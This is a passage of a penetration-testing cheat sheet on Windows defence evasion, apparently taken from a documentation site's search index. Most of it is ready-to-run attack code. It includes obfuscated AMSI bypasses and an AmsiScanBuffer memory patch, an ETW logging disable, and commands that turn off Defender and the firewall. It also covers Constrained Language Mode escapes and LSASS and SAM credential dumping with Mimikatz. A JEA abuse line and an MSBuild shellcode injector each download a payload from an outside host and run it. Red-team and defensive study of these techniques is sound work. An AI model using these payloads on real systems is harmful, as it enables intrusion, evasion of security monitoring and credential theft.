<pre><code>[internetshortcut]\nurl=c:\\windows\\system32\\calc.exe\n</code></pre>"},{"location":"pentesting/Evasion/","title":"Evasion","text":""},{"location":"pentesting/Evasion/#general","title":"General","text":""},{"location":"pentesting/Evasion/#enumerating-av-edr","title":"Enumerating AV / EDR","text":"<ul> <li>https://github.com/tothi/serviceDetector <pre><code>python3 serviceDetector.py -conf conf/edr.json &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;TARGET&gt;\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#run-against-multiple-targets","title":"Run against multiple targets","text":"<pre><code>cat targets.txt | parallel -j 50 python3 serviceDetector.py -conf conf/edr.json &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;TARGET&gt;\n</code></pre>"},{"location":"pentesting/Evasion/#get-all-gpos-applied-to-a-machine","title":"Get all GPO's applied to a machine","text":"<ul> <li>Run with elevated prompt <pre><code>gpresult /H gpos.html\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#windows-defender","title":"Windows Defender","text":"<ul> <li>Detects On-disk, In-Memory (AMSI) and Behavioural</li> </ul>"},{"location":"pentesting/Evasion/#check-if-windows-defender-is-running","title":"Check if windows defender is running","text":"<pre><code>Get-MpComputerStatus\nGet-MpComputerStatus | Select RealTimeProtectionEnabled\n</code></pre>"},{"location":"pentesting/Evasion/#get-info-about-windows-defender","title":"Get info about Windows Defender","text":"<pre><code>Get-MpPreference\n</code></pre>"},{"location":"pentesting/Evasion/#find-excluded-folder-from-windows-defender","title":"Find excluded folder from Windows Defender","text":"<pre><code>Get-MpPreference | select Exclusion*\n(Get-MpPreference).Exclusionpath\n</code></pre>"},{"location":"pentesting/Evasion/#script-to-dump-mde-config-asr-rules","title":"Script to dump MDE config / ASR rules","text":"<ul> <li>https://github.com/BlackSnufkin/Invoke-DumpMDEConfig?tab=readme-ov-file</li> </ul>"},{"location":"pentesting/Evasion/#create-exclusion","title":"Create exclusion","text":"<pre><code>Set-MpPreference -ExclusionPath \"&lt;path&gt;\"\n</code></pre>"},{"location":"pentesting/Evasion/#check-av-detections","title":"Check AV Detections","text":"<pre><code>Get-MpThreatDetection | Sort-Object -Property InitialDetectionTime \n</code></pre>"},{"location":"pentesting/Evasion/#get-last-av-detection","title":"Get last AV Detection","text":"<pre><code>Get-MpThreatDetection | Sort-Object -Property InitialDetectionTime | Select-Object -First 1\n</code></pre>"},{"location":"pentesting/Evasion/#disable-av-monitoring","title":"Disable AV monitoring","text":"<pre><code>Set-MpPreference -DisableRealtimeMonitoring $true\nSet-MpPReference -DisableIOAVProtection $true\n\npowershell.exe -c 'Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPReference -DisableIOAVProtection $true'\n</code></pre>"},{"location":"pentesting/Evasion/#asr-rules","title":"ASR Rules","text":""},{"location":"pentesting/Evasion/#enumerate-asr-rules","title":"Enumerate ASR rules","text":"<ul> <li>https://github.com/directorcia/Office365/blob/master/win10-asr-get.ps1 <pre><code>. ./win10-asr-get.ps1\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#windows-firewall","title":"Windows Firewall","text":""},{"location":"pentesting/Evasion/#get-state","title":"Get state","text":"<pre><code>Get-NetFirewallProfile -PolicyStore ActiveStore\n</code></pre>"},{"location":"pentesting/Evasion/#get-rules","title":"Get rules","text":"<pre><code>Get-netfirewallrule | format-table name,displaygroup,action,direction,enabled -autosize\n</code></pre>"},{"location":"pentesting/Evasion/#disable-firewall","title":"Disable Firewall","text":"<pre><code>Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False \n</code></pre>"},{"location":"pentesting/Evasion/#enable-firewall","title":"Enable firewall","text":"<pre><code>Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True\n</code></pre>"},{"location":"pentesting/Evasion/#change-default-policy","title":"Change default policy","text":"<pre><code>Set-NetFirewallProfile -DefaultInboundAction Block -DefaultOutboundAction Allow \n</code></pre>"},{"location":"pentesting/Evasion/#open-port-on-firewall","title":"Open port on firewall","text":"<pre><code>netsh advfirewall firewall add rule name=\"Allow port\" dir=in action=allow protocol=TCP localport=&lt;PORT&gt;\n\nNew-NetFirewallRule -DisplayName \"Allow port\" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort &lt;PORT&gt;\n</code></pre>"},{"location":"pentesting/Evasion/#remove-firewall-rule","title":"Remove firewall rule","text":"<pre><code>Remove-NetFirewallRule -DisplayName \"Allow port\"\n</code></pre>"},{"location":"pentesting/Evasion/#powershell","title":"PowerShell","text":""},{"location":"pentesting/Evasion/#powershell-detections","title":"Powershell detections","text":"<ul> <li>System-wide transcription</li> <li>Script Block logging </li> <li>Module logging</li> <li>AntiMalware Scan Interface (AMSI)</li> <li>Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)</li> </ul>"},{"location":"pentesting/Evasion/#start-64-bit-powershell","title":"Start 64 bit powershell","text":"<pre><code>%SystemRoot%\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe\n</code></pre>"},{"location":"pentesting/Evasion/#execution-policy","title":"Execution-policy","text":"<ul> <li>It is not a security boundary.</li> </ul>"},{"location":"pentesting/Evasion/#get-execution-policy","title":"Get Execution policy","text":"<pre><code>Get-Executionpolicy\n</code></pre>"},{"location":"pentesting/Evasion/#bypass-execution-policy","title":"Bypass execution policy","text":"<ul> <li>Not meant to be a security measure <pre><code>powershell \u2013executionpolicy bypass .\\script.ps1\npowershell \u2013c &lt;cmd&gt;\npowershell \u2013enc\npowershell.exe -executionpolicy bypass\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#amsi","title":"AMSI","text":"<ul> <li>https://amsi.fail/</li> <li>Get an AMSI bypass string and then obfuscate manually</li> </ul>"},{"location":"pentesting/Evasion/#amsi-bypass-string","title":"AMSI bypass string","text":"<pre><code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n</code></pre>"},{"location":"pentesting/Evasion/#amsi-bypass-string-obfuscated","title":"AMSI bypass string obfuscated","text":"<pre><code>S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  \"{1}{0}\"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  ).\"A`ss`Embly\".\"GET`TY`Pe\"((  \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) ).\"g`etf`iElD\"(  ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  )).\"sE`T`VaLUE\"(  ${n`ULl},${t`RuE} )\n</code></pre> <pre><code>$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v.\"Get`Fie`ld\"('ams' + 'iInitFailed','NonPublic,Static').\"Set`Val`ue\"($null,$true)\n</code></pre>"},{"location":"pentesting/Evasion/#amsi-bypass-string-2-obfuscated","title":"AMSI bypass string 2 obfuscated","text":"<pre><code>$MethodDefinition = @\"\n[DllImport(`\"kernel32`\",  EntryPoint=\"GetProcAddress\")]\npublic static extern IntPtr GetProc(IntPtr hModule, string procName);\n\n[DllImport(`\"kernel32`\")]\npublic static extern IntPtr GetModuleHandle(string lpModuleName);\n\n[DllImport(`\"kernel32`\",EntryPoint=\"VirtualProtect\" )]\npublic static extern bool Virtual(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n\"@;\n$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kern' -NameSpace 'W' -PassThru;\n$ABSD = 'Ams'+'iS'+'canBuffer';\n$handle = [W.Kern]::GetModuleHandle('ams'+'i.dll');\n[IntPtr]$BAddress = [W.Kern]::GetProc($handle, $ABSD);\n[UInt32]$Size = 0x5;\n[UInt32]$PFlag = 0x40;\n[UInt32]$OFlag = 0;\n[W.Kern]::Virtual($BAddress, $Size, $PFlag, [Ref]$OFlag);\n$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);\n[system.runtime.interopservices.marshal]::copy($buf, 0, $BAddress, 6);\n</code></pre>"},{"location":"pentesting/Evasion/#etw","title":"ETW","text":"<ul> <li>Event Tracing for Windows</li> <li>Very effective way of hunting .NET</li> <li>Reflectivly modify the PowerShell process to prevent events being published. ETW feeds ALL of the other logs so this disabled everything!</li> <li>Also bypasses scriptblock logging</li> </ul> <pre><code>[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static'); $EventProvider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid()); $EtwProvider.SetValue($null, $EventProvider);\n</code></pre>"},{"location":"pentesting/Evasion/#obfusacted","title":"Obfusacted","text":"<pre><code>[Reflection.Assembly]::\"l`o`AdwIThPa`Rti`AlnamE\"(('S'+'ystem'+'.C'+'ore')).\"g`E`TTYPE\"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der')).\"gET`FI`eLd\"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance')).\"seTVa`l`Ue\"([Ref].\"a`sSem`BlY\".\"gE`T`TyPE\"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der')).\"gEtFIe`Ld\"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static')).\"gE`Tva`lUe\"($null),0)\n</code></pre>"},{"location":"pentesting/Evasion/#constrained-lanuage-mode","title":"Constrained Lanuage Mode","text":""},{"location":"pentesting/Evasion/#check-the-language-mode","title":"Check the language mode","text":"<pre><code>$ExecutionContext.SessionState.LanguageMode\n</code></pre>"},{"location":"pentesting/Evasion/#escapes-for-constrained-language-mode","title":"Escapes for Constrained Language Mode","text":""},{"location":"pentesting/Evasion/#launch-powershell-version-2","title":"Launch Powershell Version 2","text":"<pre><code>Powershell.exe -Version 2\n</code></pre>"},{"location":"pentesting/Evasion/#overwrite-__pslockdownpolicy-variable","title":"Overwrite __PSLockdownPolicy variable","text":"<ul> <li>If CLM is not implemented correctly and is using __PSLockdownPolicy</li> </ul>"},{"location":"pentesting/Evasion/#check-the-__pslockdownpolicy-value","title":"Check the __PSLockdownPolicy value","text":"<ul> <li>Value 4 is enabled</li> <li>Value 8 is disabled <pre><code>(Get-ItemProperty 'hklm:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -name \"__PSLockdownPolicy\").__PSLockDownPolicy\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#set-lockdown-policy-to-8-and-check-language-mode","title":"Set lockdown policy to 8 and check language mode","text":"<ul> <li>https://github.com/Metoraf007/Public_PowerShell/blob/master/Bypass_ConstrainedLang.ps1 <pre><code>Set-ItemProperty 'hklm:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -name \"__PSLockdownPolicy\" -Value 8\npowershell.exe\n$ExecutionContext.SessionState.LanguageMode\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#powershx","title":"PowerShx","text":"<ul> <li>https://github.com/iomoath/PowerShx <pre><code>rundll32 PowerShx.dll,main -i \nPowerShx.exe -i  \n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#powershdll-run-powershell-with-dlls-only","title":"PowerShdll Run PowerShell with dlls only.","text":"<ul> <li>https://github.com/p3nt4/PowerShdll</li> <li>Does not require access to powershell.exe as it uses powershell automation dlls. <pre><code>rundll32 PowerShdll,main -i\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#download-files-with-certutil","title":"Download files with certutil","text":"<ul> <li>You can not use iwr but you can use certutil in constrained language mode <pre><code>certutil -urlcache -split -f &lt;URL&gt;\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#execute-scripts","title":"Execute scripts","text":"<ul> <li>It is possible to execute scripts on the filesystem but you can't load them!</li> <li>If applocker is there enumerate it to find a directory that lets you execute scripts in</li> </ul>"},{"location":"pentesting/Evasion/#logging-evasion","title":"Logging evasion","text":""},{"location":"pentesting/Evasion/#invisi-shell","title":"Invisi-shell","text":"<ul> <li>Bypasses all logging</li> <li>https://github.com/OmerYa/Invisi-Shell</li> <li>Type exit from the new PowerShell session to complete the clean-up.</li> </ul>"},{"location":"pentesting/Evasion/#with-admin-privileges","title":"With admin privileges","text":"<pre><code>./RunWithPathAsAdmin.bat \n</code></pre>"},{"location":"pentesting/Evasion/#with-non-admin-privileges","title":"With non-admin privileges:","text":"<pre><code>RunWithRegistryNonAdmin.bat\n</code></pre>"},{"location":"pentesting/Evasion/#script-block-logging-bypass","title":"Script Block logging bypass","text":"<ul> <li>Bypass ETW</li> </ul>"},{"location":"pentesting/Evasion/#winrs","title":"Winrs","text":"<ul> <li>Use Winrs instead of PSRemoting to evade System-wide-transcript and deep script block logging <pre><code>winrs -remote:server1 -u:&lt;COMPUTERNAME&gt;\\&lt;USER&gt; -p:&lt;PASS&gt; hostname\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#just-enough-admin","title":"Just Enough Admin","text":"<ul> <li>Defines allowed cmdledt and commands that are allowed by defining role capabilities.</li> </ul>"},{"location":"pentesting/Evasion/#connect-with-jea-endpoint","title":"Connect with JEA endpoint","text":"<ul> <li>Use <code>DOMAIN\\USER</code> format <pre><code>$creds = get-credential\n$sess = New-PSSession -ComputerName &lt;FQDN&gt; -ConfigurationName &lt;JEA ENDPOINT CONF NAME&gt; -Credential $creds\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#get-the-pssession-configurations-and-jea","title":"Get the PSSession configurations (and JEA)","text":"<pre><code>Get-PSSessionconfiguration\n</code></pre>"},{"location":"pentesting/Evasion/#get-pssession-capabilities","title":"Get PSSession capabilities","text":"<pre><code>Get-PSSessionCapability -ConfigurationName &lt;NAME&gt; -Username &lt;DOMAIN&gt;\\&lt;USERNAME&gt;\n</code></pre>"},{"location":"pentesting/Evasion/#abuse-jea","title":"Abuse JEA","text":"<ul> <li>Only when its misconfigured and allows dangerous commands like net.exe or cmdlets like Start-Process or Start-Service.</li> <li>Allows the use of wildcard.</li> <li>Check which commands are allowed to run and google for abuses</li> <li>https://www.triplesec.info/slides/3c567aac7cf04f8646bf126423393434.pdf <pre><code>Get-Command\n\n# Abuse example\nStart-Process cmd.exe calc.exe\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#abuse-creating-functions","title":"Abuse - Creating functions","text":"<ul> <li>If JEA enpoint is running in Constrained Language Mode instead of NoLanguage it is possible to create your own functions!</li> <li>Creates a function with the name <code>gl</code> and executes it.</li> <li>Shortcut would be <code>${ &lt;COMMAND&gt;}</code> <pre><code>function gl {Get-Location}; gl\n\nfunction gl {whoami}; gl\n\nfunction gl {powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://&lt;IP&gt;/shell.ps1'))\"}; gl\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#abuse-grant-a-user-to-admin","title":"Abuse - Grant a user to admin","text":"<pre><code>Add-ADGroupMember, Add-LocalGroupMember, net.exe, dsadd.exe\n</code></pre>"},{"location":"pentesting/Evasion/#abuse-running-arbritary-code","title":"Abuse - Running arbritary code","text":"<pre><code>Start-Process, New-Service, Invoke-Item, Invoke-WmiMethod, Invoke-Command,\nNew-ScheduledTask, Register-ScheduledJob\n\nInvoke-Command -ScriptBlock {net localgroup administrators &lt;USER&gt; /add}\n</code></pre>"},{"location":"pentesting/Evasion/#abuse-set-pssessionconfiguration","title":"Abuse - Set-PSSessionConfiguration","text":"<ul> <li>From https://github.com/samratashok/RACE/blob/master/RACE.ps1</li> <li>After finding a profile to edit, can also edit <code>microsoft.powershell</code> which is the normal remoting endpoint!</li> </ul>"},{"location":"pentesting/Evasion/#connect-and-check-the-config","title":"Connect and check the config","text":"<pre><code>$sess = New-PSSession -ComputerName &lt;FQDN&gt; -Credential $creds -ConfigurationName &lt;ENDPOINT&gt;\nEnter-PSSession $sess\nGet-PSSessionConfiguration\n</code></pre>"},{"location":"pentesting/Evasion/#get-original-sddl","title":"Get original SDDL","text":"<pre><code>$existingSDDL = (Get-PSSessionConfiguration -Name \"&lt;PROFILE&gt;\" -Verbose:$false).SecurityDescriptorSDDL\n</code></pre>"},{"location":"pentesting/Evasion/#get-sid-for-new-user-to-add","title":"Get SID  for new user to add","text":"<pre><code>$SID = (Get-DomainUser &lt;USER&gt;).Objectsid\n</code></pre>"},{"location":"pentesting/Evasion/#create-new-sddl-with-a-new-user-sid","title":"Create new SDDL with a new USER SID","text":"<pre><code>$isContainer = $false  \n$isDS = $false  \n$SecurityDescriptor = New-Object -TypeName Security.AccessControl.CommonSecurityDescriptor -ArgumentList $isContainer,$isDS, $existingSDDL\n$accessType = \"Allow\"  \n$accessMask = 268435456  \n$inheritanceFlags = \"none\"  \n$propagationFlags = \"none\"  \n$SecurityDescriptor.DiscretionaryAcl.AddAccess($accessType,$SID,$accessMask,$inheritanceFlags,$propagationFlags) | Out-Null\n$newSDDL = $SecurityDescriptor.GetSddlForm(\"All\")\n$newSDDL\n</code></pre>"},{"location":"pentesting/Evasion/#change-the-config","title":"Change the config","text":"<pre><code>Set-PSSessionConfiguration -name \"&lt;PROFILE&gt;\" -SecurityDescriptorSddl \"&lt;SDDL&gt;\" -force -Confirm:$false\n</code></pre>"},{"location":"pentesting/Evasion/#reconnect-and-check-the-config","title":"Reconnect and check the config","text":"<pre><code>$sess = New-PSSession -ComputerName &lt;FQDN&gt; -Credential $creds -ConfigurationName &lt;ENDPOINT&gt;\nEnter-PSSession $sess\nGet-PSSessionConfiguration\n</code></pre>"},{"location":"pentesting/Evasion/#connect-to-reconfigured-new-endpoint","title":"Connect to reconfigured new endpoint","text":"<pre><code>$sess2 = New-PSSession -ComputerName &lt;FQDN&gt; -Credential $creds2 -ConfigurationName &lt;RECONFIGURED ENDPOINT&gt;\nEnter-PSSession $sess\nGet-PSSessionConfiguration\n</code></pre>"},{"location":"pentesting/Evasion/#applocker","title":"Applocker","text":"<ul> <li>AppLocker rules are split into 5 categories - <code>Executable</code>, <code>Windows Installer</code>, <code>Script</code>, <code>Packaged App</code> and <code>DLLs</code>, and each category can have its own enforcement (enforced, audit only, none).</li> <li>AppLocker has a set of default allow rules such as, <code>allow everyone to execute anything within C:\\Windows\\*</code> - the theory being that everything in <code>C:\\Windows</code> is trusted and safe to execute.</li> <li>The difficulty of bypassing AppLocker depends on the robustness of the rules that have been implemented. The default rule sets are quite trivial to bypass in a number of ways:</li> <li>Executing untrusted code via trusts LOLBAS's.</li> <li>Finding writeable directories within \"trusted\" paths.</li> <li>By default, AppLocker is not even applied to Administrators.</li> <li>Uploading into <code>C:\\Windows</code> requires elevated privileges, but there are places like <code>C:\\Windows\\Tasks</code> that are writeable by standard users. </li> <li>DLL enforcement very rarely enabled due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break.</li> <li>Good repo for bypasses: https://github.com/api0cradle/UltimateAppLockerByPassList</li> </ul>"},{"location":"pentesting/Evasion/#check-if-applocker-is-enabled","title":"Check if Applocker is enabled","text":"<pre><code>Get-AppLockerPolicy -Effective\n</code></pre>"},{"location":"pentesting/Evasion/#enumerate-applocker-policy","title":"Enumerate Applocker policy","text":"<pre><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n</code></pre> <pre><code>Get-ChildItem \"HKLM:Software\\Policies\\Microsoft\\Windows\\SrpV2\"\nGet-ChildItem \"HKLM:Software\\Policies\\Microsoft\\Windows\\SrpV2\\Exe\"\n\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\SRPV2\n</code></pre>"},{"location":"pentesting/Evasion/#check-policy-with-gporesult","title":"Check policy with GPOresult","text":"<ul> <li>Open the HTLM file locally <pre><code>gpresult /H gpos.html\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#parse-gpo-applocker","title":"Parse GPO applocker","text":"<ul> <li>https://github.com/PowerShell/GPRegistryPolicy <pre><code>Get-DomainGPO -Identity *applocker*\nParse-PolFile \"&lt;GPCFILESYSPATH FROM GET-DOMAINGPO&gt;\\Machine\\Registry.pol\" | select ValueName, ValueData\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#if-code-integrity-is-enforced-and-powershell-is-running-in-constrained-langauge-mode-use-winrs-instead-of-psremoting","title":"If code integrity is enforced and PowerShell is running in Constrained Langauge Mode use winrs instead of psremoting","text":"<pre><code>runas /netonly /user:&lt;DOMAIN\\&lt;USER&gt; cmd.exe\nwinrs -r:&lt;PC NAME&gt; cmd\n</code></pre>"},{"location":"pentesting/Evasion/#check-for-the-policy-on-disk","title":"Check for the policy on disk","text":"<ul> <li><code>.p7b</code> is a signed policy</li> <li>Check if there are any <code>.xml</code> files which didn't got removed with the policy <pre><code>ls C:\\Windows\\system32\\CodeIntegrity\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#wdac","title":"WDAC","text":"<ul> <li>Tool to bypass: https://github.com/nettitude/Aladdin</li> </ul>"},{"location":"pentesting/Evasion/#disable-wdac","title":"Disable WDAC","text":"<ul> <li>Policy in <code>C:\\Windows\\System32\\CodeIntegrity\\</code> in a <code>.p7b</code> file. Delete the file and reboot to delete policy.</li> <li>Only works if WDAC isn't enforced through GPO but setup locally!</li> </ul>"},{"location":"pentesting/Evasion/#check-for-wdac","title":"Check for WDAC","text":"<pre><code>Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard\n</code></pre>"},{"location":"pentesting/Evasion/#check-for-the-policy-on-disk_1","title":"Check for the policy on disk","text":"<ul> <li><code>.p7b</code> is a signed policy</li> <li>Check if there are any <code>.xml</code> files which didn't got removed with the policy <pre><code>ls C:\\Windows\\system32\\CodeIntegrity\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#code-signing","title":"Code signing","text":"<ul> <li>Code signing ensures that files weren't tampered with and are verified by a trusted authority.</li> <li>ADCS code signing EKU = <code>Code Signing</code> (<code>1.3.6.1.5.5.7.3.3</code>)</li> <li>Requires Code Signing cert to be extracted from a system, or created through ADCS and it should be allowed in the WDAC policy!</li> </ul>"},{"location":"pentesting/Evasion/#convert-pem-to-pfx-with-openssl","title":"Convert Pem to PFX with openssl","text":"<pre><code>openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n</code></pre>"},{"location":"pentesting/Evasion/#check-pfx-file-for-code-signing-eku","title":"Check .pfx file for code signing EKU","text":"<ul> <li><code>Code Signing 1.3.6.1.5.5.7.3.3</code></li> <li><code>Cert Hash(sha1)</code> to validate cert hash <pre><code>certutil -v -dump -p \"&lt;PASSWORD&gt;\" &lt;PATH TO PFX&gt;\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#sign-a-tool","title":"Sign a tool","text":"<ul> <li>https://learn.microsoft.com/en-us/dotnet/framework/tools/signtool-exe <pre><code>.\\signtool.exe sign /fd SHA256 /a /f &lt;PATH TO PFX FILE&gt; /p '&lt;PASSWORD&gt;' &lt;EXE TO SIGN&gt;\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#get-signer-certificate-of-tool","title":"Get Signer Certificate of tool","text":"<pre><code>Get-AuthenticodeSignature -FilePath &lt;PATH TO EXE&gt;\n</code></pre>"},{"location":"pentesting/Evasion/#lolbas","title":"LOLBAS","text":"<ul> <li>Use Microsoft Signed Binaries to exploit https://lolbas-project.github.io/</li> <li>Can be used to bypass Applocker or WDAC</li> </ul>"},{"location":"pentesting/Evasion/#rundll32exe-and-comsvcsdll-dumping-lsass","title":"rundll32.exe and comsvcs.dll dumping lsass:","text":"<pre><code>Get-Process | Select-String lsass\nrundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump &lt;PROCESS ID&gt; C:\\Users\\Public\\lsass.dmp full\ndir C:\\Users\\Public\\lsass.dmp\n\nInvoke-Mimikatz -Command '\"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords\"'\n</code></pre>"},{"location":"pentesting/Evasion/#regexe-dumping-sam","title":"Reg.exe dumping sam","text":"<pre><code>reg save HKLM\\SECURITY security.bak\nreg save HKLM\\SYSTEM system.bak\nreg save HKLM\\SAM sam.bak\n\nInvoke-Mimikatz -Command '\"lsadump::sam system.bak sam.bak\"'\nsecretsdump.py -sam sam.bak -security security.bak -system system.bak local\n</code></pre>"},{"location":"pentesting/Evasion/#rundll32exe-dll-payload","title":"rundll32.exe dll payload","text":"<pre><code>C:\\Windows\\System32\\rundll32.exe &lt;FILE&gt;.dll,StartW\n</code></pre>"},{"location":"pentesting/Evasion/#msbuiltexe","title":"Msbuilt.exe","text":"<ul> <li>Can be used to execute arbitrary C# code from a <code>.csproj</code> or <code>.xml</code> file. <pre><code>msbuild.exe &lt;FILE&gt;\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#example-shellcode-injector","title":"Example shellcode injector","text":"<pre><code>&lt;Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"&gt;\n  &lt;Target Name=\"MSBuild\"&gt;\n   &lt;MSBuildTest/&gt;\n  &lt;/Target&gt;\n   &lt;UsingTask\n    TaskName=\"MSBuildTest\"\n    TaskFactory=\"CodeTaskFactory\"\n    AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" &gt;\n     &lt;Task&gt;\n      &lt;Code Type=\"Class\" Language=\"cs\"&gt;\n        &lt;![CDATA[\n\n            using System;\n            using System.Net;\n            using System.Runtime.InteropServices;\n            using Microsoft.Build.Framework;\n            using Microsoft.Build.Utilities;\n\n            public class MSBuildTest :  Task, ITask\n            {\n                public override bool Execute()\n                {\n                    byte[] shellcode;\n                    using (var client = new WebClient())\n                    {\n                        client.BaseAddress = \"http://&lt;IP&gt;\";\n                        shellcode = client.DownloadData(\"shellcode.bin\");\n                    }\n\n                    var hKernel = LoadLibrary(\"kernel32.dll\");\n                    var hVa = GetProcAddress(hKernel, \"VirtualAlloc\");\n                    var hCt = GetProcAddress(hKernel, \"CreateThread\");\n\n                    var va = Marshal.GetDelegateForFunctionPointer&lt;AllocateVirtualMemory&gt;(hVa);\n                    var ct = Marshal.GetDelegateForFunctionPointer&lt;CreateThread&gt;(hCt);\n\n                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);\n                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);\n\n                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);\n                    WaitForSingleObject(t, 0xFFFFFFFF);\n\n                    return true;\n                }\n\n            [DllImport(\"kernel32\", CharSet = CharSet.Ansi)]\n            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);\n\n            [DllImport(\"kernel32\", CharSet = CharSet.Ansi)]\n            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n\n            [DllImport(\"kernel32\")]\n            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);\n\n            [UnmanagedFunctionPointer(CallingConvention.StdCall)]\n            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n            [UnmanagedFunctionPointer(CallingConvention.StdCall)]\n            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n            }\n\n        ]]&gt;\n      &lt;/Code&gt;\n    &lt;/Task&gt;\n  &lt;/UsingTask&gt;\n&lt;/Project&gt;\n</code></pre>"},{"location":"pentesting/Evasion/#example-powershell-clm","title":"Example PowerShell clm","text":"<pre><code>&lt;Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"&gt;\n  &lt;Target Name=\"MSBuild\"&gt;\n   &lt;MSBuildTest/&gt;\n  &lt;/Target&gt;\n   &lt;UsingTask\n    TaskName=\"MSBuildTest\"\n    TaskFactory=\"CodeTaskFactory\"\n    AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" &gt;\n     &lt;Task&gt;\n     &lt;Reference Include=\"System.Management.Automation\" /&gt;\n      &lt;Code Type=\"Class\" Language=\"cs\"&gt;\n        &lt;![CDATA[\n\n            using System;\n            using System.Linq;\n            using System.Management.Automation;\n            using System.Management.Automation.Runspaces;\n\n            using Microsoft.Build.Framework;\n            using Microsoft.Build.Utilities;\n\n            public class MSBuildTest :  Task, ITask\n            {\n                public override bool Execute()\n                {\n                    using (var runspace = RunspaceFactory.CreateRunspace())\n                    {\n                      runspace.Open();\n\n                      using (var posh = PowerShell.Create())\n                      {\n                        posh.Runspace = runspace;\n                        posh.AddScript(\"$ExecutionContext.SessionState.LanguageMode\");\n\n                        var results = posh.Invoke();\n                        var output = string.Join(Environment.NewLine, results.Select(r =&gt; r.ToString()).ToArray());\n\n                        Console.WriteLine(output);\n                      }\n                    }\n\n                return true;\n              }\n            }\n\n        ]]&gt;\n      &lt;/Code&gt;\n    &lt;/Task&gt;\n  